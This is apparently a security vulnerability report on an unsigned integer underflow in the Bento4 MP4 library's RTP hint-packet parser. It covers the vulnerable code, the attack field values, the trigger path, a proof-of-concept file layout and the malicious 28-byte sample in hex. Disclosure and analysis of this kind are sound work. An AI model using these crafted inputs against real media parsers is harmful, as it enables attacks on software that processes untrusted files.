# VULN-004: Integer Underflow in extra_length (AP4_RtpPacket)

## Classification
- **CWE**: CWE-191 (Integer Underflow) → CWE-834 (Excessive Iteration)
- **File**: `Source/C++/Core/Ap4RtpHint.cpp`, lines 222–246
- **Function**: `AP4_RtpPacket::AP4_RtpPacket(AP4_ByteStream&)`

## Vulnerability Description

In the `AP4_RtpPacket` stream constructor, when the `extra_flag` bit is set in an RTP
hint packet, the code reads an `extra_length` field (AP4_UI32) and then loops over
"extra" entries, subtracting each `entry_length` from `extra_length`:

```cpp
AP4_UI32 extra_length;
stream.ReadUI32(extra_length);      // attacker-controlled value (e.g. 0x10 = 16)
if (extra_length < 4) return;
extra_length -= 4;                  // → 12

while (extra_length > 0) {
    AP4_UI32 entry_length;
    AP4_UI32 entry_tag;
    stream.ReadUI32(entry_length);  // attacker sets 0x10000000
    stream.ReadUI32(entry_tag);
    if (entry_length < 8) return;
    // ... seek or read entry data ...
    extra_length -= entry_length;   // CWE-191: 12 - 0x10000000 = 0xF000000C
}                                   // while (0xF000000C > 0) → TRUE
```

The subtraction `extra_length -= entry_length` silently wraps because both operands
are unsigned 32-bit integers. After the wrap, `extra_length = 0xF000000C`, and the
`while` condition remains `true`.

## Attack Values

| Field          | Value         | Effect                           |
|----------------|---------------|----------------------------------|
| `extra_length` | `0x00000010`  | 16 raw → 12 after initial -=4    |
| `entry_length` | `0x10000000`  | 268,435,456 bytes (huge)         |
| Subtraction    | 12 - 0x10000000 | = 0xF000000C (unsigned wrap)   |
| Next loop test | 0xF000000C>0  | TRUE → continues                 |

## Practical Effect

On the next iteration, the stream is positioned far past EOF (the seek to
`cur_pos + entry_length - 8 = cur_pos + 0x0FFFFFF8` is executed on a file
stream, possibly succeeding on most OS's). Subsequent `ReadUI32` calls return 0
(Bento4's `AP4_ByteStream::ReadUI32` sets `value = 0` on failure). Since
`0 < 8`, the `if (entry_length < 8) return;` guard fires and the loop exits.

**Net result**: The loop runs exactly **twice** (not infinitely) due to EOF
reads returning 0. The main observable effect is:
1. An unsigned integer underflow (CWE-191) occurs.
2. The stream position is corrupted to a position ≈ 268 million bytes beyond EOF.
3. The `AP4_RtpPacket` object is left in an incompletely-initialized state.

## Why No ASAN/UBSAN Detection

- **ASAN**: No out-of-bounds memory access at the underflow site; ASAN does not fire.
- **UBSAN**: Unsigned integer overflow/underflow is **defined behavior** in C/C++
  (wraps mod 2^32), so UBSAN's `sub_overflow` handler does not apply to unsigned types.

Detection would require:
- A custom fuzzing harness watching for excessive loop iterations, OR
- A linter/static analysis tool (e.g. CodeChecker, Clang-tidy with unsigned arithmetic checks).

## Trigger Path

```
mp4rtphintinfo main()
  → AP4_HintTrackReader::Create(hint_track, movie, ssrc, reader)
  → AP4_HintTrackReader::AP4_HintTrackReader()
  → GetRtpSample(0)
  → AP4_RtpSampleData(rtp_data_stream, sample_size)
  → AP4_RtpPacket(stream)      ← parses the 28-byte hint sample
  → extra_length -= entry_length   ← UNDERFLOW
```

## Why mp42aac Cannot Trigger This

`AP4_RtpSampleData` and `AP4_RtpPacket` are **not linked** into the `mp42aac`
binary (confirmed via `nm` / `strings`). The `mp42aac` program:
1. Opens the MP4 file and parses atom headers.
2. Locates the audio track (handler='soun').
3. Calls `WriteSamples()` on the audio track's AAC frames.
4. **Never** reads hint track samples or creates an `AP4_HintTrackReader`.

The correct trigger binary is `mp4rtphintinfo` (Source/C++/Apps/Mp4RtpHintInfo/),
which explicitly calls `AP4_HintTrackReader::Create()` and then iterates RTP packets.
This binary is **not compiled** in `build_test/bin/`.

## PoC File Structure

```
vuln_004.mp4 (925 bytes):
  ftyp (24 bytes)
  moov (865 bytes)
    mvhd
    trak id=1 (soun)   ← audio track for mp42aac compatibility
      tkhd, mdia(mdhd + hdlr(soun) + minf(smhd+dinf+stbl[empty]))
    trak id=2 (hint)   ← hint track with malicious sample
      tkhd
      tref → hint(track_id=1)
      mdia
        mdhd, hdlr(hint)
        minf
          hmhd, dinf
          stbl
            stsd → 'rtp ' entry (AP4_RtpHintSampleEntry) + tims
            stts: 1 sample, delta=1
            stsc: chunk 1 → 1 sample/chunk, stsd_idx=1
            stsz: sample_size=28, count=1
            stco: chunk_offset=897   ← points to mdat payload
  mdat (36 bytes)
    [28 bytes: malicious hint sample with entry_length=0x10000000]
```

## Malicious Sample Hex

```
00010000 00000000 0000 00 04 0000 00000010 10000000 41414141
^^^^^^^^ ^^^^^^^^ ^^^^ ^^ ^  ^^^^ ^^^^^^^^ ^^^^^^^^ ^^^^^^^^
pkt_cnt  rel_time seed f1 f3 cnt  ext_len  ent_len  tag(AAAA)
```

- `00 01` = packet_count = 1
- `00 00` = reserved
- `00000000` = relative_time = 0
- `00` = flags1 (p=0, x=0)
- `00` = flags2 (m=0, pt=0)
- `0000` = sequence_seed
- `00` = discard byte
- `04` = flags3 → extra_flag = 1
- `0000` = constructor_count = 0
- `00000010` = extra_length = 16
- `10000000` = entry_length = **0x10000000** (attack value)
- `41414141` = entry_tag = 'AAAA'
